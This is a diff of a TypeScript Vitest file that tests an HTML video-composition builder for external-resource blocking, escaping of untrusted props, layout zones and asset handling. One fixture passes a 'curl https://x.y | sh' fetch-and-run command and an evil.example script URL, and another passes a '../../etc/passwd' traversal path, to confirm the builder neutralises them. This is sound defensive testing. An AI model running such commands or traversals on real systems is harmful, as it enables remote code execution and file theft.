@@ -1,5 +1,6 @@
 import { runInNewContext } from "node:vm";
 import { DETERMINISTIC_PROPS_EXAMPLES, type DeterministicKind, type Scene } from "@video-studio/schema";
+import { layoutZones } from "@video-studio/platforms";
 import { describe, expect, it } from "vitest";
 import { buildComposition, compositionIdFor, fmtNumber, layerNodes, sanitizeFontChain } from "./hyperframes-compose.js";
 import { highlightLines, languageFamily, tokenize } from "./hyperframes-highlight.js";
@@ -60,7 +61,8 @@ describe("buildComposition: snapshots of DETERMINISTIC_PROPS_EXAMPLES", () => {
     it(`${kind} (9:16)`, () => {
       const c = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
       expect(c.html).toMatchSnapshot();
-      expect({ assets: c.assets, warnings: c.warnings }).toMatchSnapshot();
+      // Asset sources are absolute host paths; snapshot where they land in the composition.
+      expect({ assets: c.assets.map((a) => a.dest), warnings: c.warnings }).toMatchSnapshot();
     });
   }
   it("chart variants and landscape layouts build", () => {
@@ -137,12 +139,18 @@ describe("buildComposition: HyperFrames contract", () => {
   });
 });
 
+/** Assets other than the bundled font files (present whenever fonts/ exists). */
+const own = (assets: { src: string; dest: string }[]) => assets.filter((a) => !a.dest.startsWith("assets/fonts/"));
+const BUNDLED_FONT_URL = /url\("(assets\/fonts\/[A-Za-z0-9._-]+)"\)/g;
+
 describe("buildComposition: no external resources", () => {
   const external = /\b(?:https?:)?\/\/[a-z0-9]|<link\b|@import|url\(|\bhref=|\bsrcset=/i;
   it("example compositions reference nothing outside the composition dir", () => {
     for (const kind of KINDS) {
-      const { html } = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
-      expect(html, kind).not.toMatch(external);
+      const { html, assets } = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
+      // Bundled fonts are the only url() loads, and they point inside the composition dir.
+      expect(html.replace(BUNDLED_FONT_URL, ""), kind).not.toMatch(external);
+      for (const m of html.matchAll(BUNDLED_FONT_URL)) expect(assets.map((a) => a.dest)).toContain(m[1]);
       for (const m of html.matchAll(/\bsrc="([^"]*)"/g)) expect(m[1]).toMatch(/^assets\//);
     }
   });
@@ -150,7 +158,7 @@ describe("buildComposition: no external resources", () => {
     const { html } = buildComposition(req("cta", { headline: "Go", action: "Install", url: "https://evil.example/x.js", command: "curl https://x.y | sh" }));
     expect(html).toContain(">https://evil.example/x.js</div>");
     expect(html).not.toMatch(/(?:src|href)="https?:/);
-    expect(html).not.toMatch(/<link\b|@import|url\(/);
+    expect(html.replace(BUNDLED_FONT_URL, "")).not.toMatch(/<link\b|@import|url\(/);
   });
   it("fonts are local-only @font-face rules (stops producer Google Fonts fetches)", () => {
     const { html } = buildComposition(req("typography", { lines: ["x"] }));
@@ -181,7 +189,7 @@ describe("buildComposition: escaping untrusted props", () => {
     };
     const c = buildComposition(req("typography", { lines: ["x"] }, { tokens }));
     expect(c.html).not.toContain("</style><script>");
-    expect(c.html).not.toMatch(/url\(/);
+    expect(c.html.replace(BUNDLED_FONT_URL, "")).not.toMatch(/url\(/);
     expect(c.html).toContain("--vs-primary: #4F8CFF;");
     expect(c.warnings.some((w) => w.includes("color_primary"))).toBe(true);
     expect(sanitizeFontChain('Inter"; }, Arial', "sans-serif").css).toBe('"Arial", sans-serif');
@@ -202,39 +210,61 @@ describe("buildComposition: tokens, safe areas, assets", () => {
     expect(html).toContain("background: var(--vs-bg)");
   });
 
-  it("keeps content inside the 9:16 safe area (top 10%, bottom caption band)", () => {
+  it("keeps content inside the design-grid content zone without platform zones", () => {
     const { html } = buildComposition(req("typography", { lines: ["x"] }));
-    expect(html).toContain(".vs-safe { position: absolute; left: 76px; top: 192px; width: 929px; height: 1119px;");
+    expect(html).toContain(".vs-safe { position: absolute; left: 72px; top: 180px; width: 936px; height: 1060px;");
     const small = buildComposition(req("typography", { lines: ["x"] }, { target: { width: 180, height: 320, fps: 30, aspect_ratio: "9:16" } }));
-    expect(small.html).toContain("top: 32px;");
-    expect(small.html).toContain("height: 186px;");
+    expect(small.html).toContain("top: 30px;");
+    expect(small.html).toContain("height: 177px;");
+  });
+
+  it("lays content inside zones.content when zones are given", () => {
+    const zones = { ...layoutZones({ width: 1080, height: 1920, aspect_ratio: "9:16" }), content: { x: 72, y: 180, w: 857, h: 1060 } };
+    const { html, text_boxes } = buildComposition({ ...req("typography", { lines: ["Hello"] }), zones });
+    expect(html).toContain(".vs-safe { position: absolute; left: 72px; top: 180px; width: 857px; height: 1060px;");
+    for (const b of text_boxes) expect(b.rect.x + b.rect.w).toBeLessThanOrEqual(72 + 857);
+  });
+
+  it("reports text boxes with roles, sizes, truncation and colours", () => {
+    const hook = buildComposition({ ...req("typography", { lines: ["Hello", "world"] }), scene: { ...req("typography", { lines: ["Hello", "world"] }).scene, purpose: "hook" } });
+    expect(hook.text_boxes).toEqual([
+      expect.objectContaining({ role: "hook", text: "Hello\nworld", truncated: false, color: "#F5F7FA", background: "#0B0F19" }),
+    ]);
+    const cta = buildComposition(req("cta", DETERMINISTIC_PROPS_EXAMPLES.cta));
+    expect(cta.text_boxes.map((b) => b.role)).toContain("cta");
+    for (const b of cta.text_boxes) {
+      expect(b.font_px).toBeGreaterThan(0);
+      expect(b.rect.y).toBeGreaterThanOrEqual(180);
+    }
+    const long = buildComposition(req("typography", { lines: [Array(300).fill("overflowing").join(" ")] }));
+    expect(long.text_boxes[0]).toMatchObject({ role: "headline", truncated: true });
   });
 
   it("resolves screenshot assets inside the project only and copies them under assets/", () => {
     const ok = buildComposition(req("screenshot", { asset: "a1", callouts: ["Click", { text: "Here", x: 0.25, y: 40 }] }), { resolveAsset: (id) => (id === "a1" ? "source/assets/shot.png" : undefined) });
-    expect(ok.assets).toEqual([{ src: "/proj/source/assets/shot.png", dest: "assets/screenshot-1.png" }]);
+    expect(own(ok.assets)).toEqual([{ src: "/proj/source/assets/shot.png", dest: "assets/screenshot-1.png" }]);
     expect(ok.html).toContain('src="assets/screenshot-1.png"');
     expect(ok.html).toContain("left:25%;top:40%");
     expect(ok.warnings).toEqual([]);
 
     const escape = buildComposition(req("screenshot", { asset: "a1" }), { resolveAsset: () => "../../etc/passwd.png" });
-    expect(escape.assets).toEqual([]);
+    expect(own(escape.assets)).toEqual([]);
     expect(escape.warnings.join()).toMatch(/outside the project/);
 
     const byPath = buildComposition(req("screenshot", { asset: "shots/one.jpg" }));
-    expect(byPath.assets).toEqual([{ src: "/proj/shots/one.jpg", dest: "assets/screenshot-1.jpg" }]);
+    expect(own(byPath.assets)).toEqual([{ src: "/proj/shots/one.jpg", dest: "assets/screenshot-1.jpg" }]);
 
     const missing = buildComposition(req("screenshot", { asset: "a9" }));
-    expect(missing.assets).toEqual([]);
+    expect(own(missing.assets)).toEqual([]);
     expect(missing.html).toContain("vs-shot-missing");
   });
 
   it("adds the brand logo to cta and end_card", () => {
     const tokens = { ...TOKENS, logo_path: "brand/logo.svg" };
     const c = buildComposition(req("end_card", { title: "T" }, { tokens }));
-    expect(c.assets).toEqual([{ src: "/proj/brand/logo.svg", dest: "assets/logo-1.svg" }]);
+    expect(own(c.assets)).toEqual([{ src: "/proj/brand/logo.svg", dest: "assets/logo-1.svg" }]);
     expect(c.html).toContain('<img src="assets/logo-1.svg"');
-    expect(buildComposition(req("typography", { lines: ["x"] }, { tokens })).assets).toEqual([]);
+    expect(own(buildComposition(req("typography", { lines: ["x"] }, { tokens })).assets)).toEqual([]);
   });
 
   it("reports props it cannot honour", () => {
